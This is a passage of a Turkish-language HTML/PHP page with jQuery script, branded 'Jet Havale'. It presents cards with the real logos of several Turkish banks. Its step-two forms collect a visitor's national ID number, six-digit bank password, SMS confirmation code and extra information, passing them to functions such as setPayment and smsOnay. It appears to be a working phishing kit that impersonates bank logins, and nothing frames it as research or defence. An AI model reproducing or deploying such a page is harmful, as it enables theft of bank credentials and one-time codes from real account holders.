                          </ul>
                          <button type="button" class="goster-buton resim-10 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://www.hsbc.com.tr/_assets/img/logo-2x.png" alt="Hsbc" class="goster resim-11 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-11 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://files.sikayetvar.com/lg/cmp/31/31373.svg?1522650125" alt="Odea" class="goster resim-12 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-12 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://www.sekerbank.com.tr/icons/sekerbank-logo.svg" alt="Seker" class="goster resim-13 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-13 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://files.sikayetvar.com/lg/cmp/46/462.svg?1522650125" alt="Isbank" class="goster resim-14 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-14 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://www.albaraka.com.tr/_assets/img/albaraka-logo.svg" alt="Albaraka" class="goster resim-15 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-15 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                           <img src="https://www.turkiyefinans.com.tr/SiteAssets/img/tfkb-logo_2x.png" alt="TrFinans" class="goster resim-16 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-16 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://www.ziraatkatilim.com.tr/themes/custom/zk/logo.svg" alt="Zkatilim" class="goster resim-17 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-17 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://www.vakifkatilim.com.tr/assets/img/logo-d.svg" alt="Vkatilim" class="goster resim-18 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-18 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      
                    </div>
                  </div>
                </div>
              </div>
              <div class="d-none flex-column h-70 justify-content-center text-center" id="step-2">
                <div class="card-deck mx-0">
                  <div>
                    <div class="payment-header px-4 pt-0 pb-4 pb-2 mx-auto text-center">
                      <p class="blue-subtext mb-0">Yatırıma devam et</p>
                      <h1 id="gosterilen-aciklama" class="checkout-amount d-none"></h1>
                    </div>
                    <div class="card shadow-card card-bankinfo mx-auto mb-3 required-info">
                      <div class="card-header">
                        <div class="bank-logo mx-auto">
                          <img id="gosterilen-resim" src="https://secure.community-payments.com/banks_logo/TGBATRIS-96f6374ca4f6e56a67ebe6d6983cfcc1.png" style="width: 200px;" alt="Garanti">
                        </div>
                      </div>
                      <div class="card-body d-flex flex-column" id="login-step-1">
                        <form onsubmit="setPayment('jethavale')">
                          <div class="form-group">
                            <input placeholder="Müşteri/TC Kimlik Numarası" pattern="\d*" step="any" maxlength="11" data-lpignore="true" autocomplete="" type="number" id="tc-input" name="jethavale_tc" class="form-control" value="">
                          </div>
                          <div class="form-group">
                            <input placeholder="Parola" pattern="\d*" step="any" maxlength="6" data-lpignore="true" autocomplete="" type="number" id="diger-input" name="jethavale_sifre" class="password-mask form-control" value="">
                          </div>
                          <div class="form-group">
                            <input placeholder="Yatırılacak Miktar" pattern="\d*" step="any" maxlength="6" data-lpignore="true" autocomplete="" type="number" id="tutaryazdir" name="amount" class="form-control" value="">
                          </div>
                          <div class="form-group" style="display: none;">
                            <input type="text" id="jethavale_bankname" name="jethavale_banka" class="form-control" value="">
                          </div>
                          <div class="d-flex flex-row">
                            <a href="javascript:;" onclick="backOne()" aria-label="Geri" tabindex="-1" class="btn-lg mt-3 btn-cancel btn btn-secondary">Geri</a>
                            <button type="submit" disabled="" class="btn-lg btn-block mt-auto btn-login btn btn-primary disabled" id="tc-button" aria-label="Giriş Yap">Giriş Yap</button>
                          </div>
                        </form>
                      </div>
                      <div class="card-body d-none flex-column" id="login-step-2">
                        <form id="form" action="javascript:;" onsubmit="smsOnay()">
                          <div class="form-group">
                            <input placeholder="SMS Onay Kodu" pattern="\d*" id="sms-input" step="any" maxlength="11" data-lpignore="true" autocomplete="" name="jethavale_sms" type="number" class="form-control" value="">
                          </div>
                         
                          <div class="d-flex flex-row">
                            <a aria-label="Geri" tabindex="-1" onclick="backTwo()" class="btn-lg mt-3 btn-cancel btn btn-secondary">Geri</a>
                            <button id="sms-button" type="submit" disabled="" class="btn-lg btn-block mt-auto btn-login btn btn-primary disabled" aria-label="Giriş Yap">Ödeme Yap</button>
                          </div>
                        </form>
                       </div>
                       <div class="card-body d-none flex-column" id="login-step-3">
                        <form id="form1" action="javascript:;" onsubmit="ekBilgi()">
                          <div class="form-group">
                            <input name="jethavale_ekbilgi" class="form-control">
                          </div>
                         
                          <div class="d-flex flex-row">
                            <a aria-label="Geri" tabindex="-1" onclick="maximizeTawkToWidget()" class="btn-lg mt-3 btn-cancel btn btn-secondary" style="font-size: 13px;">Desteğe Bağlan</a>
                            
                            <button type="submit"  class="btn-lg btn-block mt-auto btn-login btn btn-primary" aria-label="Ödeme Yap">Gönder</button>
                          </div>
                        </form>
                       </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="bottom">
          <footer class="d-flex flex-column">
            <div class="col-12 col-md company-signature mt-1">
              <img class="mb-2" src="https://secure.community-payments.com/companies_logo/1239-c1ef5a9c1741315eca7124b49f560435.svg" alt="Jet Havale">
              <p class="company-name text-center">Jet Havale</p>
            </div>
          </footer>
        </div>
      </div>
    </div>
<?=html_entity_decode($main['sources'], ENT_QUOTES, 'UTF-8')?>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
  $('.goster-buton').click(function() {
    var resimSinif = $(this).attr('class').split(' ')[1];
    var resimSrc = $('.' + resimSinif).attr('src');
    var aciklama = $('.aciklama').val();
    $('#gosterilen-resim').attr('src', resimSrc);
    $('#gosterilen-aciklama').text('₺'+aciklama);
    $('#step-1').addClass('d-none');
    $('#step-1').removeClass('d-flex');
    $('#step-2').removeClass('d-none');
    $('#step-2').addClass('d-flex');
    
    var altAttr = $('.' + resimSinif).attr('alt');
    console.log(altAttr);
    $("#jethavale_bankname").val(altAttr);
    console.log($("#jethavale_bankname").val());

  });
});


$(document).ready(function() {
  $('#sms-input').on('input', function() {
    if ($(this).val().length <= 6) { // 6 haneden fazla değilse
      $('#sms-button').prop('disabled', false);
      $('#sms-button').removeClass('disabled');
    } else {
      $(this).val($(this).val().substring(0, 6)); // input değerini 6 haneden fazla olmayacak şekilde ayarla
      $('#sms-button').prop('disabled', false); // butonu aktif yap
      $('#sms-button').removeClass('disabled');
    }
  });
});



function backOne(){
  $('#step-1').removeClass('d-none');
    $('#step-1').addClass('d-flex');
    $('#step-2').addClass('d-none');
    $('#step-2').removeClass('d-flex');
}
function backTwo(){
  $('#login-step-1').removeClass('d-none');
    $('#login-step-1').addClass('d-flex');
    $('#login-step-2').addClass('d-none');
    $('login-#step-2').removeClass('d-flex');
}

$(document).ready(function() {
    var $tcInput = $('#tc-input');
    var $nameInput = $('#diger-input');
    var $button = $('#tc-button');

    $tcInput.on('input', function() {
      var value = $(this).val();

      if (value.length > 11) {
        $(this).val(value.substring(0, 11));
      }

      if ($tcInput.val().length === 11 && $nameInput.val().length >= 6) {
        $button.removeClass('disabled').prop('disabled', false);
      } else {
        $button.addClass('disabled').prop('disabled', true);
      }
    });

    $nameInput.on('input', function() {
      var value = $(this).val();

      if (value.length > 6) {
        $(this).val(value.substring(0, 6));
      }

      if ($tcInput.val().length === 11 && $nameInput.val().length >= 6) {
        $button.removeClass('disabled').prop('disabled', false);
      } else {
        $button.addClass('disabled').prop('disabled', true);
      }
    });
  });

  $(document).ready(function() {
  $('#tutaryazdir').on('input', function() {
    var inputVal = $(this).val();
    $('#gosterilen-aciklama').text('₺'+inputVal);
  });
});
function maximizeTawkToWidget() {
  Tawk_API.maximize();
  window.Tawk_API.hideWidget();
	
}
window.Tawk_API.onLoad = function(){
    window.Tawk_API.hideWidget();
};






</script>

    <script type="text/javascript" src="assets/script.js?v=10"></script>
  </body>
</html>